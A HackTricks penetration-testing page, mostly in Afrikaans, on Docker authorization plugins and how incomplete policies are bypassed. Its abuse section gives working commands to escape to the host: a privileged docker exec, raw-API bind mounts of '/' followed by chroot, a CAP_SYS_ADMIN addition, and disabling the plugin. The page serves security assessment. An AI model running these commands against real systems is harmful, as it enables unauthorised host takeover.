# Runtime-magtigings-inproppe

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Runtime-magtigings-inproppe is 'n ekstra beleidslaag wat besluit of 'n oproeper 'n gegewe daemon-aksie mag uitvoer. Docker is die klassieke voorbeeld. Per verstek het enigiemand wat met die Docker daemon kan kommunikeer effektief uitgebreide beheer oor dit. Magtigings-inproppe probeer daardie model versmally deur die geverifieerde gebruiker en die aangevraagde API-handeling te ondersoek, en dan die versoek volgens beleid toe te staan of te weier.

Hierdie onderwerp verdien 'n eie bladsy omdat dit die uitbuitingsmodel verander wanneer 'n aanvaller reeds toegang het tot 'n Docker API of tot 'n gebruiker in die `docker` group. In sulke omgewings is die vraag nie meer net "can I reach the daemon?" nie, maar ook "is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?"

## Werking

Wanneer 'n versoek die Docker daemon bereik, kan die magtigingssubstelsel die versoekkonteks aan een of meer geïnstalleerde inproppe deurgee. Die inprop sien die geverifieerde gebruiker-identiteit, die versoekbesonderhede, geselekteerde headers, en dele van die versoek- of antwoordliggaam wanneer die content type geskik is. Meervoudige inproppe kan gekoppel word, en toegang word slegs toegestaan as alle inproppe die versoek toelaat.

Hierdie model lyk sterk, maar die veiligheid daarvan hang heeltemal af van hoe volledig die beleidskrywer die API verstaan het. 'n Inprop wat `docker run --privileged` blokkeer maar `docker exec` ignoreer, alternatiewe JSON-sleutels soos topvlak `Binds` mis, of inprop-administrasie toelaat, kan 'n vals gevoel van beperking skep terwyl direkte privilege-escalation paths steeds oopbly.

## Algemene inprop-teikens

Belangrike areas vir beleid-oorsig is:

- endpunte vir container-skepping
- `HostConfig`-velde soos `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, en opsies om namespaces te deel
- `docker exec`-gedrag
- inprop-beheer-endpunte
- enige endpunt wat indirek runtime-aksies kan veroorsaak buite die bedoelde beleidmodel

Historically, examples such as Twistlock's `authz` plugin and simple educational plugins such as `authobot` made this model easy to study because their policy files and code paths showed how endpoint-to-action mapping was actually implemented. For assessment work, the important lesson is that the policy author must understand the full API surface rather than only the most visible CLI commands.

## Misbruik

Die eerste doel is om te leer wat werklik geblokkeer word. As die daemon 'n aksie weier, die fout leaks dikwels die plugin-naam, wat help om die beheer in gebruik te identifiseer:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
As jy 'n breër eindpuntprofilering benodig, is gereedskap soos `docker_auth_profiler` nuttig omdat dit die andersins herhalende taak outomatiseer om te kontroleer watter API-roetes en JSON-strukture regtig deur die plugin toegelaat word.

As die omgewing 'n pasgemaakte plugin gebruik en jy met die API kan interakteer, enumereer watter objekvelde werklik gefiltreer word:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Hierdie kontroles is belangrik omdat baie autorisasiefoute veldspesifiek is eerder as konsepspesifiek. 'n Plugin kan 'n CLI-patroon verwerp sonder om die ekwivalente API-struktuur volledig te blokkeer.

### Volledige Voorbeeld: `docker exec` voeg bevoegdheid by ná container-skepping

'n Beleid wat bevoorregte container-skepping blokkeer, maar onbeperkte container-skepping plus `docker exec` toelaat, kan steeds omseil word:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
As die daemon die tweede stap aanvaar, het die gebruiker 'n privileged interactive process binne 'n container teruggekry wat die beleidsskrywer as beperk beskou het.

### Volledige voorbeeld: Bind Mount Through Raw API

Sommige gebrekkige beleide inspekteer net een JSON shape. As die root filesystem bind mount nie konsekwent geblokkeer word nie, kan die host steeds gemount word:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselfde idee kan ook onder `HostConfig` verskyn:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die impak is 'n volledige ontsnapping uit die gasheer se lêerstelsel. Die interessante detail is dat die omseiling voortkom uit onvolledige beleidsdekking en nie uit 'n kernel-bug nie.

### Volledige voorbeeld: Ongekontroleerde Capability-attribuut

As die beleid vergeet om 'n capability-verwante attribuut te filter, kan die aanvaller 'n container skep wat 'n gevaarlike capability herwin:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sodra `CAP_SYS_ADMIN` of 'n soortgelyk sterk bevoegdheid teenwoordig is, raak baie breakout techniques wat in [capabilities.md](protections/capabilities.md) en [privileged-containers.md](privileged-containers.md) beskryf word, bereikbaar.

### Volledige Voorbeeld: Deaktiveer die Plugin

As plugin-management-operasies toegelaat word, mag die netste omseiling wees om die beheer heeltemal af te skakel:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dit is 'n beleidversuim op die beheer-vlak. Die autorisasielaag bestaan, maar die gebruiker wat dit veronderstel was om te beperk, behou steeds die toestemming om dit af te skakel.

## Kontroles

Hierdie opdragte is gerig op die identifisering of 'n beleidlaag bestaan en of dit volledig of oppervlakkig blyk te wees.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Wat hier interessant is:

- Weierboodskappe wat 'n plugin naam insluit, bevestig 'n autorisasielaag en onthul dikwels die presiese implementering.
- 'n pluginlys sigbaar vir die aanvaller kan genoeg wees om te ontdek of deaktiveer- of herkonfigureer-operasies moontlik is.
- 'n beleid wat slegs duidelike CLI-aksies blokkeer maar nie rou API-versoeke nie, moet as omseilbaar beskou word totdat die teendeel bewys is.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Nie standaard geaktiveer nie | Daemon-toegang is effektief alles-of-niks tensy 'n authorization plugin gekonfigureer is | onvolledige pluginbeleid, blacklists in plaas van allowlists, toelaat van plugin management, veldvlak blinde kolle |
| Podman | Nie 'n algemene direkte ekwivalent nie | Podman staat gewoonlik meer op Unix-permissies, rootless-uitvoering, en API-blootstellingsbesluite as op Docker-styl authz plugins | blootstelling van 'n rootful Podman API wyd-regoor, swak socket-permissies |
| containerd / CRI-O | Ander beheermodel | Hierdie runtimes staat gewoonlik op socket-permissies, node-trougrense, en hoërlaag orchestrator-kontroles eerder as Docker authz plugins | die socket in workloads mount, swak node-lokale vertrouensaanname |
| Kubernetes | Gebruik authn/authz op die API-server en kubelet-lae, nie Docker authz plugins nie | Cluster RBAC en admission controls is die hoof beleidslaag | oor-breed RBAC, swak admissionbeleid, direkte blootstelling van kubelet of runtime APIs |
{{#include ../../../banners/hacktricks-training.md}}
